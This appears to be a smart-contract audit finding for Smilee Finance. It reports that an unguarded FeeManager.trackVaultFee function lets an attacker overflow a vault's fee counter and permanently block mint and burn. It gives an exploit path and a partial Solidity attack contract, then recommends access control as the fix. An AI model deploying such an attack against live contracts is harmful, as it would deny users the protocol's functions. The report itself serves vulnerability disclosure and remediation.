# DVP's _mint/_burn function could be DoS by FeeManager.

## Summary
Attacker could deploy malicious contract which conform to IDVP interface, then use it to call FeeManager.trackVaultFee(), set vaultFeeAmounts[vault] to max uint, make DVP's _mint/_burn (and IG's mint/burn) function unusable.

## Vulnerability Detail
In DVP, _burn and _mint function use FeeManager.trackVaultFee() to record vault fee:

https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/DVP.sol#L329

In FeeManager.trackVaultFee(), vault fee is recorded in public mapping vaultFeeAmounts:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/FeeManager.sol#L218-L227

Thus, there is an exploit path:
1, Attacker deploy a malicious contract that conform to IDVP and has 'vault' variable equals to victim IG's vault.
2, Attacker use this contract to call FeeManager.trackVaultFee(), set vaultFeeAmounts[vault] to max uint
3, Now in the situation when common user try to call mint/burn function in IG, and vault fee is not zero, function will revert due to vaultFeeAmounts[vault] overflow in FeeManager.trackVaultFee().
4, Because this is no other way to change or decrease vaultFeeAmounts[vault], this IG will lose it's mint/burn function forever.

Malicous contract example below:
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.15;

interface IFeeManager {
    function trackVaultFee(address vault, uint256 feeAmount) external;
    function vaultFeeAmounts(address) external view returns(uint256);
}


contract Attack {
    address public vault;
    address public feeManager;

    constructor(address IGVaultAddr, address feeManagerAddr) {
        vault = IGVaultAddr;  // send victim IG's vault here.
        feeManager = feeManagerAddr;
    }

    function attack() public {
        IFeeManager FM = IFeeManager(feeManager);
        // caculate how much vault fee to add to reach max uint.
        uint256 toMaxUint = type(uint256).max - FM.vaultFeeAmounts(vault);
        // set vaultFeeAmounts[vault] to max uint.
        FM.trackVaultFee(vault, toMaxUint);
    }

    ...

}
```

## Impact
The mint/burn function of DVP/IG could be Dos.

## Tool used

Manual Review

## Recommendation
The key of exploit is anyone could call trackVaultFee, add access control so that only dvp can call trackVaultFee is a solution.
